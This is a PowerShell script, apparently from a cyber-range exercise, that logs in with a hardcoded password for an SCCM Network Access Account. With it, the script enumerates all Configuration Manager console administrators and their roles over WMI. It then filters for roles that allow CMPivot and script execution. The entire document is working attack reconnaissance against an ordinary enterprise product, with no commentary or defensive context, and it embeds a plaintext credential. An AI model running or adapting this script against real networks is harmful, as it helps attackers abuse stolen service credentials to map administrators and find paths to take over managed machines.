# Enumerate SCCM admins + roles as svc_naa (provider DCOM access) — analyst_t1 (ws01)
$ErrorActionPreference = 'Continue'
$mp = 'mbr02.range.local'
$naa = New-Object System.Management.Automation.PSCredential('RANGE\svc_naa', (ConvertTo-SecureString 'N@A_s3rv1c3!' -AsPlainText -Force))
$ns = 'root\SMS\site_CAD'

Write-Output '=== SMS_Admin: ALL console admins ==='
$admins = Get-WmiObject -ComputerName $mp -Credential $naa -Namespace $ns -Class SMS_Admin -ErrorAction Stop
foreach ($a in $admins) {
  Write-Output ("  LogonName=" + $a.LogonName + " | AdminID=" + $a.AdminID + " | DisplayName=" + $a.DisplayName)
  Write-Output ("    Roles=" + ($a.Roles -join ' , '))
  Write-Output ("    Categories=" + ($a.Categories -join ' ; '))
}

Write-Output ''
Write-Output '=== SMS_AdminRole: roles + CMPivot/Script operations ==='
$roles = Get-WmiObject -ComputerName $mp -Credential $naa -Namespace $ns -Class SMS_AdminRole -ErrorAction SilentlyContinue
foreach ($role in $roles) {
  $ops = $role.Operations
  $hit = $ops | Where-Object { $_ -match 'CMPivot|Run Script|Create Script|Read|Modify' }
  Write-Output ("  Role=" + $role.RoleName + " | opCount=" + @($ops).Count + " | hits=" + (($hit | Select-Object -First 8) -join ' | '))
}
Write-Output 'ADMIN_ENUM_DONE'
